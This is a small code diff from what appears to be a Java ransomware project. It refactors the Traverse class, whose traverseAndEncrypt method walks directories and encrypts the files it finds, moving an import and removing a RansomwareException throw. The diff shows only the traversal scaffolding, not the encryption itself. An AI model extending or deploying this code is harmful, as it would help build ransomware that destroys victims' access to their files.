@@ -3,8 +3,8 @@ package Agent.traversal;
 import java.io.File;
 import java.util.Collection;
 import Agent.EncryptionAlgo.JavaCryptoUtil;
-import server.entities.CryptoKey;
-import server.exceptions.RansomwareException;
+import Agent.entites.CryptoKey;
+
 
 public abstract class Traverse {
 
@@ -24,7 +24,7 @@ public abstract class Traverse {
 
 	}
 
-	public void traverseAndEncrypt(String inputDir, Collection<File> dirs, CryptoKey key) throws RansomwareException {
+	public void traverseAndEncrypt(String inputDir, Collection<File> dirs, CryptoKey key)  {
 
 		addToStruct(new File(inputDir));
 		while (!(checkEmptyStruct())) {
@@ -44,7 +44,7 @@ public abstract class Traverse {
 
 							}
 						} catch (NullPointerException e) {
-							throw new RansomwareException();
+							
 						}
 						addToStruct(file);
 
